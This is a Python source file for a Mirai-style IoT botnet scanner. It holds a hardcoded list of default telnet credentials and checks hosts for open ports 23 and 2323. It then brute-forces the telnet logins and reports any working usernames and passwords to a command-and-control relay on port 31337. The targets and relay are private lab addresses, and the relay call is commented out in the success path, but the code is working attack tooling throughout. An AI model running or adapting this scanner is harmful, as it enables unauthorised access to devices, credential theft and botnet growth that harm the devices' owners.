import socket, time, sys, telnetlib, platform
import random
from threading import Thread

MAlist = [('root', 'xc3511'),
          ('root', 'vizxv'),
          ('root', 'admin'),
          ('admin', 'admin'),
          ('root', '888888'),
          ('root', 'xmhdipc'),
          ('root', 'default'),
          ('root', 'juantech'),
          ('root', '123456'),
          ('root', '54321'),
          ('support', 'support'),
          ('root', ''),
          ('admin', 'password'),
          ('root', 'root'),
          ('root', '12345'),
          ('user', 'user'),
          ('admin', ''),
          ('root', 'pass'),
          ('admin', 'admin1234'),
          ('root', '1111'),
          ('admin', 'smcadmin'),
          ('admin', '1111'),
          ('root', '666666'),
          ('root', 'password'),
          ('root', '1234'),
          ('root', 'klv123'),
          ('Administrator', 'admin'),
          ('service', 'service'),
          ('supervisor', 'supervisor'),
          ('guest', 'guest'),
          ('guest', '12345'),
          ('admin1', 'password'),
          ('administrator', '1234'),
          ('666666', '666666'),
          ('888888', '888888'),
          ('ubnt', 'ubnt'),
          ('root', 'klv1234'),
          ('root', 'Zte521'),
          ('root', 'hi3518'),
          ('root', 'jvbzd'),
          ('root', 'anko'),
          ('root', 'zlxx.'),
          ('root', '7ujMko0vizxv'),
          ('root', '7ujMko0admin'),
          ('root', 'system'),
          ('root', 'ikwb'),
          ('root', 'dreambox'),
          ('root', 'user'),
          ('root', 'realtek'),
          ('root', '00000000'),
          ('admin', '1111111'),
          ('admin', '1234'),
          ('admin', '12345'),
          ('admin', '54321'),
          ('admin', '123456'),
          ('admin', '7ujMko0admin'),
          ('admin', 'pass'),
          ('admin', 'meinsm'),
          ('tech', 'tech'),
          ('mother', 'fucker')]

pindex = 0

# Relay
__RELAY_H__ = "192.168.61.136"
__RELAY_P__ = 31337
__RELAY_PS_ = "||"

__TIMEOUT__ = 1     # seconds
__C2DELAY__ = 5     # seconds
__THREADS__ = 1     # threads scanner


def get_credentials():
    global MAlist, pindex

    if pindex >= len(MAlist):
        return '', ''
    user = MAlist[pindex][0]
    password = MAlist[pindex][1]
    print("[scanner] Trying %s:%s" % (user, password))
    pindex += 1
    return user, password


def c2crd(usr, psw, ip, port):
    global __RELAY_H__, __RELAY_P__, __RELAY_PS_
    while True:
        try:
            print("[scanner] Sending credentials to remote relay..")
            tcpClientA = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcpClientA.connect((__RELAY_H__, __RELAY_P__))
            tcpClientA.send(("!" + __RELAY_PS_ + usr + __RELAY_PS_ + psw + __RELAY_PS_
                             + ip + __RELAY_PS_ + str(port)).encode('ascii'))
            data = tcpClientA.recv(1024)
            data = str(data, 'utf-8', 'ignore')
            if data == "10":
                tcpClientA.close()
                print("[scanner] Remote relay returned code 10(ok).")
                break
        except Exception as e:
            print("[scanner] Unable to contact remote relay (%s)" % str(e))
            time.sleep(5)
            pass


def bruteport(ip, port, time_interval=0):
    global pindex, MAlist
    random.shuffle(MAlist)
    print("[scanner] Attempting to brute found IP %s" % ip)
    tn = None
    need_user = False
    while True:
        try:
            user = ""
            password = ""
            if not tn:
                asked_password_in_cnx = False
                tn = telnetlib.Telnet(ip, port)
                print("[scanner] Connection established to found ip %s" % ip)
            while True:
                response = tn.read_until(b":", 1)
                # print("Response: " + str(response))
                if "Last login" in str(response):
                    continue

                if "Login:" in str(response) or "Username:" in str(response) or "login" in str(response):
                    if time_interval > 0:
                        time.sleep(time_interval)
                    print("[scanner] Received username prompt")
                    need_user = True
                    asked_password_in_cnx = False
                    user, password = get_credentials()
                    tn.write((user + "\n").encode('ascii'))
                elif "Password:" in str(response):
                    if asked_password_in_cnx and need_user:
                        tn.close()
                        break
                    asked_password_in_cnx = True
                    if not need_user:
                        user, password = get_credentials()
                    if user == '' and password == '':
                        print("[scanner] Bruteforce failed, out of range..")
                        sys.exit(0)
                    print("[scanner] Received password prompt")
                    tn.write((password + "\n").encode('ascii'))
                elif ">" in str(response) or "$" in str(response) or "#" in str(response) or "%" in str(response):
                    # broken
                    print("[scanner] Brutefoce succeeded %s " % ip + ' : '.join((user, password)))
                    # c2crd(user, password, ip, port)
                    pindex = 0
                    break
                else:
                    pass

            if ">" in str(response) or "$" in str(response) or "#" in str(response) or "%" in str(response):
                break
        except EOFError as e:
            tn = None
            need_user = False
            print("[scanner] Remote host dropped the connection (%s).." % str(e))
            time.sleep(10)
    print("[scanner] bruteport() terminated")


def scan23(ip, time_interval=0):
    print("[scanner] Scanning %s .." % ip)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(__TIMEOUT__)
    result = sock.connect_ex((ip, 23))
    if result == 0:
        print("[scanner] Found IP address: %s" % ip)
        bruteport(ip, 23, time_interval)
    else:
        print("[scanner] %s tcp/23 connectionreset" % ip)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(__TIMEOUT__)
        result = sock.connect_ex((ip, 2323))
        print("[scanner] Trying connection on failover port 2323")
        if result == 0:
            print("[scanner] Found IP address: %s" % ip)
            bruteport(ip, 2323, time_interval)
        else:
            print("[scanner] %s tcp/2323 connectionreset" % ip)
    sock.close()


def getOS():
    return platform.system() + " " + platform.release() + " " + platform.version()


def validateC2():
    print("[scanner] Connecting to remote relay ...")
    while True:
        try:
            tcpClientA = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcpClientA.connect((__RELAY_H__, __RELAY_P__))
            tcpClientA.send("#".encode('ascii'))
            data = tcpClientA.recv(1024)
            data = str(data, 'utf-8', 'ignore')
            if data == "200":
                tcpClientA.close()
                print("[scanner] Remote relay returned code 200(online).")
                break
        except:
            print("[scanner] Remote relay unreachable retrying in %s secs ..." % str(__C2DELAY__))
            time.sleep(__C2DELAY__)


def scanner():
    while True:
        try:
            # scan23(generateIP())
            scan23('192.168.61.130')
        except KeyboardInterrupt:
            print("[scanner] Terminating bot ..")
            break
        except Exception as e:
            print("[scanner] Error: " + str(e))
            break


if __name__ == "__main__":
    print("[scanner] Scanner process started ..")
    validateC2()

    for x in range(0, __THREADS__):
        thread = Thread(target=scanner)

        thread.start()

